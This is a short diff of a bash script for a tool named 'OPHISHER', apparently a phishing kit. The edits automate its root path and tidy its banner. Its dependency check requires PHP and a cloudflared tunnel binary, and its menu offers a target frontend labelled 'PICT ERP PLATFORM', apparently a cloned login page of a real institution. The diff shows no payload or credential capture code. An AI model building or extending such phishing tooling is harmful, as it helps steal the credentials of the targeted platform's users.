@@ -7,10 +7,9 @@ dependencies() {
 		echo "PHP NOT PRESENT PLS INSTALL ON /usr/bin/php"
 		exit 1
 	fi
+	path=$(pwd)
 	
-	echo  "Enter path of OPHISHER: if /home/kali/Desktop/OPHISHER then type same starting from '/' till OPHISHER dont put slash after 'OPHISHER' :"
-	read path
-	#path=/home/kali/Desktop/V2
+	echo " Root path is: $path"
 	if [ -f $path/cloudflared-linux-amd64 ]; then
 		echo ""
 	else
@@ -19,7 +18,7 @@ dependencies() {
 		exit 1
 	fi
 	
-	echo -e "DEPENDENCIES OK\n"
+	echo -e "------------------DEPENDENCIES OK------------------\n"
 	
 }
 
@@ -100,7 +99,8 @@ echo -e "\nCHECKING DEPENDENCIES ........."
 
 dependencies
 
-figlet "OPHISHER"
+figlet "    OPHISHER"
+echo "---------------------------------------------------"
 echo -e "\n WELCOME TO OPHISHER PLEASE SELECT TARGET FRONTEND\n"
 
 echo -e "[1] PICT ERP PLATFORM \n"
